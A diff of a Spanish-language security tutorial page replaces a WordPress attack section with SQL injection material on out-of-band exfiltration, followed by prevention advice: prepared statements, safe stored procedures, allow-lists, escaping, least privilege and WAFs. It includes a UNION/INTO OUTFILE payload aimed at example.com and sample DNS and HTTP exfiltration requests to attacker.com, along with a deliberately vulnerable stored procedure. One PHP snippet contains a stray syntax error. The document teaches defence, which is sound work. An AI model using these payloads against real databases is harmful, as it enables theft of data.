+Este payload realiza una inyección SQL y ejecuta una consulta que solicita un archivo en el servidor del atacante. En este caso, la consulta le pide al servidor web de la víctima que realice una petición HTTP a un servidor controlado por el atacante y pase información (en este caso, la versión de MySQL) como parte de la URL.
+
+- DNS: ' UNION SELECT NULL,NULL,(...),@@version INTO OUTFILE '\\\\example.com\\capture.txt' ;--
+
+Similar al anterior, pero en este caso, la inyección SQL hace que la base de datos intente resolver un dominio DNS. La función load_file() o una función similar intenta acceder a un recurso en el dominio controlado por el atacante. Esto puede ser aprovechado para exfiltrar información como la versión de MySQL o el nombre de usuario.</pre>
 </div>
 </div>
+<div class="ulist">
+<ul>
+<li>
+<p>La página web realiza la consulta a la base de datos, pasando el payload del atacante en la consulta SQL.</p>
+</li>
+<li>
+<p>Cómo recibe el atacante la información:</p>
+</li>
+</ul>
 </div>
-</details>
-<div class="paragraph">
-<p>Como podemos ver que el ataque lo realiza sobre Xmlrpc y que ha encontrado la contraseña root, por lo que probamos a ponerla:</p>
-</div>
-<div class="imageblock">
+<div class="listingblock">
 <div class="content">
-<img src="assets/root.png" alt="Metemos Credenciales">
+<pre>- HTTP: La base de datos realiza una petición HTTP al servidor del atacante. En este caso, el payload contiene una URL que será solicitada al servidor del atacante, permitiendo que los datos (por ejemplo, la versión de la base de datos) sean enviados como parte de los parámetros de la URL.
+
+Por ejemplo, la base de datos de la víctima hará una solicitud HTTP similar a: http://attacker.com/capture?version=5.7.35
+
+- DNS: El servidor de bases de datos realiza una consulta DNS al dominio controlado por el atacante. El atacante puede ver las consultas DNS que se envían al servidor controlado por él, y en esos registros de DNS podrá ver los datos exfiltrados, como la versión de MySQL o cualquier otra información solicitada en la consulta SQL.
+
+En este caso, el servidor de la base de datos realiza una consulta a un dominio DNS como: 5.7.35.attacker.com
+
+El atacante puede ver esta consulta en su servidor DNS y extraer la información.</pre>
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
-<img src="assets/acceso.png" alt="Acceso a WordPress">
+<img src="assets/oob/OOB.png" alt="OOB">
 </div>
-</div>
-<div class="paragraph">
-<p>Y como podemos ver, estamos dentro.</p>
 </div>
 <div style="page-break-after: always;"></div>
-</div>
 </div>
 </div>
 </div>
@@ -1032,94 +1519,216 @@ Trying root / roost Time: 00:03:02 &lt;=========================================
 <h2 id="_cómo_prevenir">¿Cómo prevenir?</h2>
 <div class="sectionbody">
 <div class="sect2">
-<h3 id="_wordpress">WordPress</h3>
+<h3 id="_1_parametrizar">1. Parametrizar</h3>
 <div class="paragraph">
-<p>WordPress al ser muy amplio, tiene muchas formas de mitigarlo, por lo que vamos a ver las más esenciales.</p>
-</div>
-<div class="sect3">
-<h4 id="_1_mantener_wordpress_plugins_y_temas_actualizados">1. Mantener WordPress, plugins y temas actualizados</h4>
-<div class="paragraph">
-<p>WordPress es un software que se mantiene y actualiza con regularidad. Por defecto, WordPress instala automáticamente actualizaciones menores. Pero las versiones principales, debe iniciarse manualmente la actualización.</p>
+<p>Las consultas parametrizadas (prepared statements) con variables asociadas (variable binding), son la forma correcta para escribir sentencias SQL. Para ello se define primero todo el código SQL y después se asocia cada parámetro variable. Este tipo de construcción permite a la base de datos distinguir entre código (estructura) y datos (valores) sin importar qué entradas proporcionó un usuario.</p>
 </div>
 <div class="paragraph">
-<p>WordPress también incluye miles de plugins y temas que puedes instalar en tu sitio web. El mantenimiento de estos plugins y temas corre a cargo de desarrolladores externos, que también lanzan actualizaciones con regularidad.</p>
+<p>Nuestra página está escrita con PHP usando solo una consulta sin preparar. Podemos observar en el siguiente ejemplo cómo sería una consulta preparada en PHP:</p>
 </div>
-</div>
-<div class="sect3">
-<h4 id="_2_utilizar_contraseñas_fuertes_y_únicas">2. Utilizar contraseñas fuertes y únicas</h4>
-<div class="paragraph">
-<p>Como ya hemos visto los intentos de pirateo de WordPress más comunes utilizan contraseñas robadas. Sin embargo, se puede dificultar utilizando contraseñas más seguras y únicas para el sitio web. Y no solo en WordPress sino en FTP, bases de datos, correos electrónicos asociados, etc. También se puede usar 2FA y gestores de contraseñas como Keepass.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_3_limitar_los_intentos_de_inicio_de_sesión">3. Limitar los intentos de inicio de sesión</h4>
-<div class="paragraph">
-<p>Se puede restringir la cantidad de intentos fallidos de acceso para prevenir ataques de fuerza bruta. Plugins como <a href="https://wordpress.org/plugins/limit-login-attempts-reloaded/">Limit Login Attempts Reloaded</a> pueden ser muy utilies para esta tarea.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_4_desactivar_xml_rpc_si_no_es_necesario">4. Desactivar XML-RPC si no es necesario</h4>
-<div class="paragraph">
-<p>XML-RPC es una API del núcleo de WordPress que ayuda a conectar tu sitio WordPress con aplicaciones web y móviles. Está activada / activa por defecto desde WordPress 3.5. Si esta API no se utiliza es muy recomendable desactivarlo. Existen varias formas, pero modificando el .htaccess es la más recomendable al no usar tantos recursos. Deberemos encontrar el archivo .htaccess y poner el siguiente código:</p>
-</div>
+<details>
+<summary class="title">Consulta preparada</summary>
+<div class="content">
 <div class="listingblock">
 <div class="content">
-<pre class="highlight"><code class="language-text" data-lang="text"># Block WordPress xmlrpc.php requests
-&lt;Files xmlrpc.php&gt;
-order deny,allow
- deny from all
-allow from 123.123.123.123
-&lt;/Files&gt;</code></pre>
-</div>
-</div>
-<div class="paragraph">
-<p>Otra forma es usando el plugin  <a href="https://wordpress.org/plugins/disable-xml-rpc-api/">Disable XML-RPC-API</a>.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_5_instalar_un_firewall_de_aplicaciones_web_waf">5. Instalar un firewall de aplicaciones web (WAF)</h4>
-<div class="paragraph">
-<p>Cómo ya hemos visto en otras ocasiones un WAF es muy útil, pero no debemos confiar toda la seguridad a este, ya que existen formas de baipasearlo.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_6_realizar_copias_de_seguridad_periódicas">6. Realizar copias de seguridad periódicas</h4>
-<div class="paragraph">
-<p>Otra de las cosas que hemos visto durante el escaneo es la falta de backups, por lo que es recomendable realizar periodicamente estas copias de seguridad, ya que en caso de ransomware puede no afectarnos tanto, aunque depende de la metodología que se siga. Hay plugins como UpdraftPlus o BlogVault y almacenan las copias en ubicaciones externas como Dropbox o Amazon S3.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_7_cambiar_el_prefijo_de_la_base_de_datos">7. Cambiar el prefijo de la base de datos</h4>
-<div class="paragraph">
-<p>Modificar el prefijo por defecto (wp_) de las tablas de la base de datos dificulta los ataques automatizados que buscan estructuras estándar.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_8_desactivar_la_edición_de_archivos_desde_el_panel_de_administración">8. Desactivar la edición de archivos desde el panel de administración</h4>
-<div class="paragraph">
-<p>Esto previene que usuarios con acceso al panel modifiquen archivos críticos directamente desde el navegador.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_9_proteger_el_archivo_htaccess_y_otros_archivos_sensibles">9. Proteger el archivo .htaccess y otros archivos sensibles</h4>
-<div class="paragraph">
-<p>Es necesario restringir el acceso a archivos como .htaccess, wp-config.php y readme.html para evitar que se exponga información sensible.</p>
-</div>
-</div>
-<div class="sect3">
-<h4 id="_10_utilizar_un_proveedor_de_alojamiento_seguro">10. Utilizar un proveedor de alojamiento seguro</h4>
-<div class="paragraph">
-<p>Existen servicios de hosting que ofrezcan medidas de seguridad robustas, como escaneos automáticos de malware, certificados SSL y soporte para actualizaciones automáticas.</p>
-</div>
-<div class="paragraph">
-<p>En caso de querer saber más sobre cómo volver más seguro entornos de WordPress vease &#8594; <a href="https://www.wpbeginner.com/es/wordpress-security/">Securizar WordPress</a>.</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre>"Si tu empresa gasta más en café que en seguridad TI, serás hackeado. Es más, merecerás ser hackeado."
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+$sentencia = $mbd-&gt;prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
+$sentencia-&gt;bindParam(':name', $nombre);
+$sentencia-&gt;bindParam(':value', $valor);
 
-— Eric S. Raymond</pre>
+// insertar una fila
+$nombre = 'uno';
+$valor = 1;
+$sentencia-&gt;execute();
+
+// insertar otra fila con diferentes valores
+$nombre = 'dos';
+$valor = 2;
+$sentencia-&gt;execute();
+?&gt;</code></pre>
 </div>
+</div>
+</div>
+</details>
+</div>
+<div class="sect2">
+<h3 id="_2_procedimientos_almacenados">2. Procedimientos almacenados</h3>
+<div class="paragraph">
+<p>Los procedimientos almacenados (stored procedures) pueden ayudar a limitar el riesgo asociado a la inyección de código SQL. Estos son código guardado en la base de datos que pueden verse como funciones reutilizables y de acceso rápido por el motor de base de datos. Los procedimientos almacenados también pueden comprobar el tipo de los parámetros de entrada, impidiendo que se introduzcan datos que incumplan el tipo que el campo está diseñado para recibir.</p>
+</div>
+<div class="paragraph">
+<p>Sin embargo, si fueron programados de forma insegura con ejecución dinámica de SQL el problema seguirá allí. Podemos ver un ejemplo de esto:</p>
+</div>
+<details>
+<summary class="title">Procedimiento almacenado vulnerable</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">CREATE PROCEDURE sp_getProductByCategory
+    @category VARCHAR(50)
+AS
+BEGIN
+    SET NOCOUNT ON;
+
+    DECLARE @query NVARCHAR(MAX);
+    SET @query = 'SELECT * FROM products WHERE category = ''' + @category + ''' AND released = 1';
+    EXECUTE sp_executesql @query;
+END</code></pre>
+</div>
+</div>
+</div>
+</details>
+<div class="paragraph">
+<p>Al crear una consulta internamente con un valor dinámico que afecta a la estructura, la situación es la misma que invocando SQL por programación. El procedimiento almacenado podría verse así con el parámetro como valor y no como parte de la estructura de la sentencia:</p>
+</div>
+<details>
+<summary class="title">Procedimiento almacenado</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">CREATE PROCEDURE sp_getProductByCategory
+    @category VARCHAR(50)
+AS
+BEGIN
+    SET NOCOUNT ON;
+
+    SELECT * FROM products WHERE category = @category AND released = 1;
+END</code></pre>
+</div>
+</div>
+</div>
+</details>
+</div>
+<div class="sect2">
+<h3 id="_3_validación_contra_valores_permitidos">3. Validación contra valores permitidos</h3>
+<div class="paragraph">
+<p>Se usa cuando no se puede usar directamente una consulta parametrizada para protegernos contra inyecciones SQL. Esto pasa en ciertos casos donde el valor que viene del usuario no puede ir como parámetro, porque no es un dato como un número o texto, sino que se trata de partes estructurales de la consulta SQL. Por ejemplo, con el nombre de una tabla o columna, o si el orden en una cláusula ORDER BY será ascendente (ASC) o descendente (DESC). En esta situación la defensa más apropiada es validar las entradas de usuario y/o rediseño de la sentencia SQL.</p>
+</div>
+<div class="paragraph">
+<p>No se debe permitir que el usuario escriba directamente un nombre de tabla o columna que se inserte tal cual en la consulta SQL, porque eso es muy peligroso. Un ejemplo de cómo validar sería usando un switch, como este ejemplo en PHP:</p>
+</div>
+<details>
+<summary class="title">White List</summary>
+<div class="content">
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+$unsafeUserParameter = $_GET['table'] ?? '';
+
+$tableName = '';
+
+// Validamos con una lista de opciones válidas
+switch ($unsafeUserParameter) {
+    case 'clients':
+        $tableName = 'table_clients';
+        break;
+    case 'sellers':
+        $tableName = 'table_sellers';
+        break;
+    ...
+    default:
+        throw new Exception("Valor inesperado proporcionado para el nombre de la tabla.");
+&gt;?
+}
+
+$query = "SELECT * FROM $tableName";</code></pre>
+</div>
+</div>
+</div>
+</details>
+<div class="ulist">
+<ul>
+<li>
+<p>Si el usuario manda el valor "clients", lo convierte a "table_clients".</p>
+</li>
+<li>
+<p>Si manda "sellers", lo convierte a "table_sellers".</p>
+</li>
+<li>
+<p>Si manda cualquier otro valor, lanzas un error.</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>De esta forma se asegura de que el nombre que se usa en la consulta sea uno de los que se controlan y no algo malicioso.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_4_escapar_todas_las_entradas_de_usuario">4. Escapar todas las entradas de usuario</h3>
+<div class="paragraph">
+<p>Esta es una forma de protegerse contra inyecciones SQL, pero no es la más recomendada. De hecho, solo se debe usar si no se puede aplicar otras defensas mejores, como las consultas parametrizadas o la validación contra valores permitidos.</p>
+</div>
+<div class="paragraph">
+<p>Escapar significa modificar (o transformar) los datos que vienen del usuario para que no puedan romper la consulta SQL ni ejecutar código malicioso. Por ejemplo, si un usuario escribe <strong>' OR 1=1 --</strong>, al escapar esa entrada, la comilla <strong>'</strong> y otros caracteres peligrosos se transforman en versiones seguras que se interpretan como texto normal y no como parte del código SQL.</p>
+</div>
+<div class="paragraph">
+<p>Esto se puede realizar con bibliotecas en el caso de java. En el caso de Mysql, podemos ver lo siguiente:</p>
+</div>
+<div class="paragraph">
+<p>Existen dos modos específicos para realizar esto en Mysql:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p><strong>ANSI_QUOTES SQL</strong>: Escapar todos los caracteres <strong>'</strong>, con <strong>''</strong>.</p>
+</li>
+<li>
+<p><strong>MySQL Mode</strong> que hace lo siguiente:</p>
+</li>
+</ol>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>NUL (0x00) --&gt; \0
+BS  (0x08) --&gt; \b
+TAB (0x09) --&gt; \t
+LF  (0x0a) --&gt; \n
+CR  (0x0d) --&gt; \r
+SUB (0x1a) --&gt; \Z
+"   (0x22) --&gt; \"
+%   (0x25) --&gt; \%
+'   (0x27) --&gt; \'
+\   (0x5c) --&gt; \\
+_   (0x5f) --&gt; \_
+
+todos los demás caracteres no alfanuméricos con valores ASCII
+inferior a 256 --&gt; \c donde 'c' es el carácter no alfanumérico original.</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Otra forma de hacerlo más seguro es convertir el texto del usuario a hexadecimal. Si un atacante intentara inyectar con la típica comilla simple ' y un espacio, el SQL final se vería:</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-sql" data-lang="sql">SELECT * FROM products WHERE hex_encode(category) = '2720...'</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>27 es el código ASCII (en hexadecimal) de la comilla simple y 20 el del espacio en blanco. Como la transformación solo genera dígitos numéricos y letras de la A a la F, ningún caracter especial puede causar la inyección.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_5_aplicar_el_mínimo_privilegio">5. Aplicar el mínimo privilegio:</h3>
+<div class="paragraph">
+<p>El principio de menor privilegio consiste en otorgar a la cuenta de base de datos utilizada por una aplicación solo los permisos estrictamente necesarios para su funcionamiento, evitando el uso de cuentas con privilegios elevados como administrador. Esto reduce el impacto de un posible ataque de inyección SQL, ya que limita lo que un atacante podría hacer si lograra explotar la vulnerabilidad.</p>
+</div>
+<div class="paragraph">
+<p>Por ejemplo, si la app solo necesita leer datos, se deben otorgar solo permisos de lectura, evitando accesos innecesarios como modificación de tablas o ejecución de comandos críticos. También se recomienda no ejecutar el servicio de base de datos con permisos elevados en el sistema operativo.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_6_web_application_firewall_waf">6. Web Application Firewall (WAF)</h3>
+<div class="paragraph">
+<p>Cómo ya hemos visto en anteriores pecados vuelve a aparecer el WAF, ya que es una herramienta de seguridad que filtra, monitorea y bloquea tráfico HTTP identificado como malicioso que viaja hacia una aplicación que se intenta proteger. Obviamente, no hay que confiarse y apostar solo por esto, ya que los problemas raíz de la aplicación no se solucionan con un WAF y continuamente se hacen públicas técnicas de bypass para WAF de distintas tecnologías y proveedores.</p>
+</div>
+<div class="paragraph">
+<p>Esto es solo una herramienta complementaria &#8594; <a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">SQL Injection Bypassing WAF</a>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre>"Si piensas que la tecnología puede resolver tus problemas de seguridad, entonces no entiendes los problemas ni entiendes la tecnología."
+
+— Bruce Schneier</pre>
 </div>
 </div>
 </div>
@@ -1128,7 +1737,7 @@ allow from 123.123.123.123
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2025-05-04 11:54:13 UTC
+Last updated 2025-05-05 16:51:33 UTC
 </div>
 </div>
 </body>
